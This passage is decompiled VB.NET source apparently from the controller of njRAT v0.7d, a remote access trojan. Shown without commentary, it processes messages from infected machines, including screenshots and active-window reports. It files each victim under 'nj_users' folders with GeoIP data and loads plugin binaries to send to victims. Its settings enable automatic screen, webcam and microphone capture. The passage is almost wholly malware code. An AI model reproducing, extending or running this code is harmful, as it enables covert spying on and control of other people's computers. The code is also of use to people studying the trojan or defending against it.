																													If flag165 Then
																														Return
																													End If
																													Class7.form1_0.Pp1.WRT(New Object() { Color.LightSteelBlue, Class6.smethod_13(), Color.DarkSlateBlue, client.COI, client.ip(), Color.SteelBlue, RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)), vbCrLf, Color.Purple, "-->", Color.White, array2(1) })
																													Return
																												Else
																													Dim flag166 As Boolean = Operators.CompareString(left, "ER", False) = 0
																													If flag166 Then
																														Dim flag167 As Boolean = Not Class7.class8_0.bool_4
																														If flag167 Then
																															Return
																														End If
																														Class7.form1_0.Pp1.WRT(New Object() { Color.LightSteelBlue, Class6.smethod_13(), Color.DarkSlateBlue, client.COI, client.ip(), Color.SteelBlue, RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)), vbCrLf, Color.Purple, "-->", Color.White, array2(1) + " " + array2(2) })
																														Return
																													Else
																														Dim flag168 As Boolean = Operators.CompareString(left, "pl", False) = 0
																														If flag168 Then
																															Try
																																client.plg.Remove(array2(1))
																															Catch ex17 As Exception
																															End Try
																															Dim flag169 As Boolean = Operators.CompareString(array2(2).ToString(), "0", False) = 0
																															If flag169 Then
																																client.plg.Add(array2(1))
																																Return
																															End If
																															Class7.smethod_2(client, Class7.smethod_0(Nothing, array2(1)), Conversions.ToBoolean(array2(2)))
																															Return
																														Else
																															Dim flag170 As Boolean = Operators.CompareString(left, "CAP", False) = 0
																															If flag170 Then
																																Try
																																	client.lastPC = DateAndTime.Now
																																	client.Isend = False
																																	Dim array35 As Byte() = CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, Class7.string_1), New Object() { 1 }, Nothing), Byte())
																																	Dim flag171 As Boolean = array35.Length < 10
																																	If flag171 Then
																																		Return
																																	End If
																																	client.L.Cells(0).Value = Image.FromStream(New MemoryStream(array35))
																																	Return
																																Catch ex18 As Exception
																																	Return
																																End Try
																															End If
																															Dim flag172 As Boolean = Operators.CompareString(left, "act", False) <> 0 OrElse client.L Is Nothing OrElse Operators.CompareString(client.lastAC, array2(1), False) = 0
																															If flag172 Then
																																Return
																															End If
																															client.lastAC = array2(1)
																															Dim online2 As Collection = Class7.form1_0.S.Online
																															SyncLock online2
																																client.L.Cells(Class7.int_11).Value = Class6.smethod_16(array2(1))
																																Return
																															End SyncLock
																														End If
																													End If
																												End If
																											End If
																										End If
																										Try
																											Dim flag173 As Boolean = client.L IsNot Nothing
																											If flag173 Then
																												Class7.form1_0.L1.method_9(client.L)
																											End If
																											Dim list10 As List(Of Object) = New List(Of Object)()
																											list10.Add(Resources.JPEG)
																											list10.Add(Class6.smethod_16(array2(1)))
																											list10.Add(Strings.Split(client.ip(), ":", -1, CompareMethod.Binary)(0))
																											Dim num48 As Integer = 2
																											Dim num49 As Integer = array2.Length - 2
																											For num50 As Integer = num48 To num49
																												Dim num51 As Integer = num50 + 1
																												Dim flag174 As Boolean = num51 = Class7.int_11 - 1
																												If flag174 Then
																													client.lastAC = array2(num50)
																													list10.Add(Class6.smethod_16(array2(num50)))
																												Else
																													Dim flag175 As Boolean = num51 = Class7.int_5
																													If flag175 Then
																														list10.Add(client.COI)
																														list10.Add(client.CName)
																													Else
																														list10.Add(array2(num50))
																													End If
																												End If
																											Next
																											client.Folder = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(list10(Class7.int_2)), "_")), RuntimeHelpers.GetObjectValue(list10(Class7.int_3)))), "_")), Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10(Class7.int_0))), "_", -1, CompareMethod.Binary)(Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10(Class7.int_0))), "_", -1, CompareMethod.Binary).Length - 1))))
																											Dim text11 As String = "\/<>?*:|"""
																											Dim num52 As Integer = 0
																											Dim length As Integer = text11.Length
																											While num52 < length
																												Dim text12 As String = Conversions.ToString(text11(num52))
																												client.Folder = client.Folder.Replace(text12, "%" + Conversion.Hex(Strings.Asc(text12)))
																												num52 += 1
																											End While
																											client.Folder = Application.StartupPath + "\nj_users\" + client.Folder + "\"
																											client.L = Class7.form1_0.L1.method_8(client.ip(), list10.ToArray())
																											client.L.Tag = client
																											list10.Clear()
																											client.plg.AddRange(Strings.Split(array2(array2.Length - 1), ",", -1, CompareMethod.Binary))
																										Catch ex19 As Exception
																										End Try
																										Dim bool_ As Boolean = Class7.class8_0.bool_1
																										If bool_ Then
																											Class7.form1_0.Pp1.WRT(New Object() { Color.LightSteelBlue, Class6.smethod_13(), Color.DarkSlateBlue, client.COI, client.ip(), Color.SteelBlue, RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)), Color.DarkBlue, "Ready" })
																										End If
																										Dim flag176 As Boolean = Not Class7.class8_0.bool_0
																										If Not flag176 Then
																											Class7.notf_0.AddItem(client.COI, String.Format(Resources.notf, New Object() { RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_2).Value), RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_3).Value), RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_7).Value), RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_6).Value), RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_9).Value), RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_0).Value), client.ip().Split(New Char() { ":"c })(0) }))
																										End If
																									End If
																								End If
																							End If
																						End If
																					End If
																				End If
																			End If
																		End If
																	End If
																End If
															End If
														End If
													End If
												End If
											End If
										End If
									End If
								End If
							End If
						End If
					End If
				End If
			Catch ex20 As Exception
				Dim ex21 As Exception = ex20
				Dim flag177 As Boolean = Operators.CompareString(array2(0), "up", False) = 0 Or Operators.CompareString(array2(0), "dw", False) = 0
				If flag177 Then
					Try
						client.Send("close" + Class7.string_1 + array2(1))
					Catch ex22 As Exception
					End Try
				Else
					Dim flag178 As Boolean = Operators.CompareString(array2(0).ToLower(), "cap", False) = 0
					If flag178 Then
						client.Isend = False
					End If
					Dim bool_2 As Boolean = Class7.class8_0.bool_3
					If bool_2 Then
						Class7.form1_0.Pp1.WRT(New Object() { Color.LightSteelBlue, Class6.smethod_13(), Color.BlueViolet, "Listner", Color.DarkRed, "ERR AT ", Color.White, array2(0), Color.Red, ex21.Message })
					End If
				End If
			End Try
		End Sub

		' Token: 0x0600034C RID: 844 RVA: 0x00023DA4 File Offset: 0x00021FA4
		Private Function InlineAssignHelper(Of T)(ByRef target As T, value As T) As T
			target = value
			Return value
		End Function

		' Token: 0x040001D3 RID: 467
		Public class8_0 As Class7.Class8 = New Class7.Class8()

		' Token: 0x040001D4 RID: 468
		Public string_0 As String = "njRAT v0.7d"

		' Token: 0x040001D5 RID: 469
		Public sk_0 As SK

		' Token: 0x040001D6 RID: 470
		Public long_0 As Long = 0L

		' Token: 0x040001D7 RID: 471
		Public long_1 As Long = 0L

		' Token: 0x040001D8 RID: 472
		Public string_1 As String = "Y262SUCZ4UJJ"

		' Token: 0x040001D9 RID: 473
		Public form1_0 As Form1

		' Token: 0x040001DA RID: 474
		Public int_0 As Integer = 1

		' Token: 0x040001DB RID: 475
		Public int_1 As Integer = 2

		' Token: 0x040001DC RID: 476
		Public int_2 As Integer = 3

		' Token: 0x040001DD RID: 477
		Public int_3 As Integer = 4

		' Token: 0x040001DE RID: 478
		Public int_4 As Integer = 5

		' Token: 0x040001DF RID: 479
		Public int_5 As Integer = 6

		' Token: 0x040001E0 RID: 480
		Public int_6 As Integer = 7

		' Token: 0x040001E1 RID: 481
		Public int_7 As Integer = 8

		' Token: 0x040001E2 RID: 482
		Public int_8 As Integer = 9

		' Token: 0x040001E3 RID: 483
		Public int_9 As Integer = 10

		' Token: 0x040001E4 RID: 484
		Public int_10 As Integer = 11

		' Token: 0x040001E5 RID: 485
		Public int_11 As Integer = 12

		' Token: 0x040001E6 RID: 486
		Public list_0 As List(Of String) = New List(Of String)()

		' Token: 0x040001E7 RID: 487
		Public list_1 As List(Of Class7.Class9) = New List(Of Class7.Class9)()

		' Token: 0x040001E8 RID: 488
		Public notf_0 As notf = New notf()

		' Token: 0x040001E9 RID: 489
		Private list_2 As List(Of Client) = New List(Of Client)()

		' Token: 0x040001EA RID: 490
		Public gclass3_0 As GClass3 = New GClass3(Application.StartupPath + "\GeoIP.dat", 1)

		' Token: 0x040001EB RID: 491
		Public waveOut_0 As WaveOut

		' Token: 0x040001EC RID: 492
		Public waveOut_1 As WaveOut

		' Token: 0x040001ED RID: 493
		Public bool_0 As Boolean = True

		' Token: 0x0200003D RID: 61
		Public NotInheritable Class Class8
			' Token: 0x06000483 RID: 1155 RVA: 0x0002DB24 File Offset: 0x0002BD24
			Public Sub method_0()
				Me.bool_0 = Conversions.ToBoolean(Class6.smethod_2("ShowAlert", "TRUE"))
				Me.bool_1 = Conversions.ToBoolean(Class6.smethod_2("LOGLOGIN", "TRUE"))
				Me.bool_2 = Conversions.ToBoolean(Class6.smethod_2("LOGCONNECTIONS", "FALSE"))
				Me.bool_3 = Conversions.ToBoolean(Class6.smethod_2("LOGLERR", "TRUE"))
				Me.bool_4 = Conversions.ToBoolean(Class6.smethod_2("LOGRERR", "TRUE"))
				Me.bool_5 = Conversions.ToBoolean(Class6.smethod_2("LOGMSGS", "TRUE"))
				Me.bool_6 = Conversions.ToBoolean(Class6.smethod_2("SCAUT", "TRUE"))
				Me.string_0 = Class6.smethod_2("SCI", "5")
				Me.bool_7 = Conversions.ToBoolean(Class6.smethod_2("CAMAUT", "TRUE"))
				Me.int_0 = Conversions.ToInteger(Class6.smethod_2("CAMI", "5"))
				Me.bool_8 = Conversions.ToBoolean(Class6.smethod_2("MICAUT", "TRUE"))
				Me.int_1 = Conversions.ToInteger(Class6.smethod_2("MICI", "1"))
				Me.int_2 = Conversions.ToInteger(Class6.smethod_2("scri", "1"))
			End Sub

			' Token: 0x06000484 RID: 1156 RVA: 0x0002DC80 File Offset: 0x0002BE80
			Public Sub method_1()
				Class6.smethod_3("ShowAlert", Me.bool_0.ToString())
				Class6.smethod_3("LOGLOGIN", Me.bool_1.ToString())
				Class6.smethod_3("LOGCONNECTIONS", Me.bool_2.ToString())
				Class6.smethod_3("LOGLERR", Me.bool_3.ToString())
				Class6.smethod_3("LOGRERR", Me.bool_4.ToString())
				Class6.smethod_3("LOGMSGS", Me.bool_5.ToString())
				Class6.smethod_3("SCAUT", Me.bool_6.ToString())
				Class6.smethod_3("SCI", Me.string_0.ToString())
				Class6.smethod_3("CAMAUT", Me.bool_7.ToString())
				Class6.smethod_3("CAMI", Me.int_0.ToString())
				Class6.smethod_3("MICAUT", Me.bool_8.ToString())
				Class6.smethod_3("MICI", Me.int_1.ToString())
				Class6.smethod_3("scri", Me.int_2.ToString())
			End Sub

			' Token: 0x0400029B RID: 667
			Public bool_0 As Boolean

			' Token: 0x0400029C RID: 668
			Public bool_1 As Boolean

			' Token: 0x0400029D RID: 669
			Public bool_2 As Boolean

			' Token: 0x0400029E RID: 670
			Public bool_3 As Boolean

			' Token: 0x0400029F RID: 671
			Public bool_4 As Boolean

			' Token: 0x040002A0 RID: 672
			Public bool_5 As Boolean

			' Token: 0x040002A1 RID: 673
			Public bool_6 As Boolean

			' Token: 0x040002A2 RID: 674
			Public string_0 As String

			' Token: 0x040002A3 RID: 675
			Public bool_7 As Boolean

			' Token: 0x040002A4 RID: 676
			Public int_0 As Integer

			' Token: 0x040002A5 RID: 677
			Public bool_8 As Boolean

			' Token: 0x040002A6 RID: 678
			Public int_1 As Integer

			' Token: 0x040002A7 RID: 679
			Public int_2 As Integer
		End Class

		' Token: 0x0200003E RID: 62
		Public NotInheritable Class Class9
			' Token: 0x06000485 RID: 1157 RVA: 0x0002DDAC File Offset: 0x0002BFAC
			Public Sub New(string_2 As String)
				Dim array As Byte() = File.ReadAllBytes(Application.StartupPath + "\plugin\" + string_2)
				Dim flag As Boolean = True
				Dim flag2 As Boolean = flag
				Me.byte_0 = Class6.smethod_8(array, flag2)
				Me.string_0 = string_2
				Me.string_1 = Class6.smethod_5(Me.byte_0)
			End Sub

			' Token: 0x040002A8 RID: 680
			Public byte_0 As Byte()

			' Token: 0x040002A9 RID: 681
			Public string_0 As String

			' Token: 0x040002AA RID: 682
			Public string_1 As String
		End Class

		' Token: 0x0200003F RID: 63
		' (Invoke) Token: 0x06000489 RID: 1161
		Public Delegate Sub Delegate0(object_0 As Object)
	End Module
End Namespace
